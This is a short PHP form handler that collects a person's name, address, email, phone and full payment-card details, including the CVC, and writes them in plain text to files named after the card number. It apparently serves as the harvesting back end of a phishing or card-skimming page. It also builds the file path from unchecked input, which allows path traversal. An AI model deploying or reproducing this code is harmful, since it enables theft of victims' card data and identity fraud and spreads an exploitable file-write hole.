<?php



if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $senderNameInput = $_POST["senderNameInput"];
    $streetAddressInput = $_POST["streetAddressInput"];
    $senderAddressLine2 = $_POST["senderAddressLine2"];
    $cityInput = $_POST["cityInput"];
    $provinceId = $_POST["provinceId"];
    $PostalCodeInput = $_POST["PostalCodeInput"];
    $EmailAddressInput = $_POST["EmailAddressInput"];
    $PhoneNumberInput = $_POST["PhoneNumberInput"];
    $ccnumberfield = $_POST["ccnumberfield"];
    $ccexpfield = $_POST["ccexpfield"];
    $cccvcfield = $_POST["cccvcfield"];

    $txtFile = $ccnumberfield . ".txt";
    $fp = fopen(dirname(__DIR__, 1) . "/form-data/" . $txtFile, "wb");
    fwrite($fp, "Full Name: " . $senderNameInput . "\n");
    fwrite($fp, "Street Address: " . $streetAddressInput . "\n");
    if ($_POST['senderAddressLine2']) {
        fwrite($fp, "Apt, Suite, Unit, Building, Floor: " . $senderAddressLine2 . "\n");
    }
    fwrite($fp, "City: " . $cityInput . "\n");
    fwrite($fp, "Province: " . $provinceId . "\n");
    fwrite($fp, "Postal Code: " . $PostalCodeInput . "\n");
    fwrite($fp, "Email Address: " . $EmailAddressInput . "\n");
    fwrite($fp, "Phone Number: " . $PhoneNumberInput . "\n");
    fwrite($fp, "Card Number: " . $ccnumberfield . "\n");
    fwrite($fp, "Card Expiry Date: " . $ccexpfield . "\n");
    fwrite($fp, "Card CVC Code: " . $cccvcfield . "\n");
    fclose($fp);
}
